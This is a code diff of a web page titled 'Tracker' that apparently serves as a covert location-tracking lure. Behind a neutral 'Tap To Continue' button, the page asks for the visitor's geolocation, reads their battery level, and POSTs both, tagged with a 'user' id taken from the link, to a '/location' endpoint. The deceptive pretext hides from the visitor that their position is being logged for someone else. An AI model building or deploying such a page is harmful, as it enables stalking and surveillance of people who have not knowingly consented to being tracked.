@@ -3,7 +3,6 @@
 
 <head>
 <title>Tracker</title>
-
 <style>
 body{
 height:100vh;
@@ -11,35 +10,24 @@ display:flex;
 justify-content:center;
 align-items:center;
 margin:0;
-font-family:Arial;
 }
-
 button{
 font-size:25px;
 padding:20px 40px;
-cursor:pointer;
 }
 </style>
-
 </head>
 
 <body>
 
-<button onclick="start()">
-Tap To Continue
-</button>
+<button onclick="getLocation()">Tap To Continue</button>
 
 <script>
 
 const params = new URLSearchParams(window.location.search)
 const user = params.get("user")
 
-async function start(){
-
-if(!navigator.geolocation){
-alert("Location not supported")
-return
-}
+function getLocation(){
 
 navigator.geolocation.getCurrentPosition(async function(pos){
 
@@ -47,10 +35,10 @@ let batteryLevel = "Unknown"
 
 if(navigator.getBattery){
 let battery = await navigator.getBattery()
-batteryLevel = Math.round(battery.level * 100)
+batteryLevel = Math.round(battery.level*100)
 }
 
-await fetch("/location",{
+fetch("/location",{
 method:"POST",
 headers:{
 "Content-Type":"application/json"
@@ -63,16 +51,11 @@ battery:batteryLevel
 })
 })
 
-alert("Please allow location to continue")
+},
+function(error){
 
-},function(err){
+alert("Location permission denied")
 
-alert("Please allow location permission")
-
-},{
-enableHighAccuracy:true,
-timeout:10000,
-maximumAge:0
 })
 
 }
